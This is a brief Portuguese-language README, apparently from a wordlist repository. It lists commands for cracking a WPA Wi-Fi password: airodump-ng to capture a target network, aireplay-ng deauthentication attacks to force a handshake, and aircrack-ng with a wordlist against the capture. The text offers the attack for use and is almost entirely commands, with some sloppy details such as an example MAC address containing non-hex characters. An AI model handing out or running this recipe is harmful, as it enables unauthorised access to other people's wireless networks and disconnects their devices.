# wordlist
airodump-ng --bssid endereço fisico da rede ex:04:8D:38:1A:3F:48 --channel ex:1 --write escrever nome da rede e sua interface ex:wlan0 
apos sera gerado 2 endereço ex:1B:45:47:L5:7H:55 e ex:55:22:33:45:14:88
depois de gerado digite:  aireplay-ng --deauth -a 1B:45:47:L5:7H:55 -c 55:22:33:45:14:88 wlan0mon ate aparecer wpa handshaker
apos 
aircrack-ng /home/william/Downloads/wordlist-master/gerado pelo aireplay-02.cap -w /home/$User/Downloads/wordlist.txt
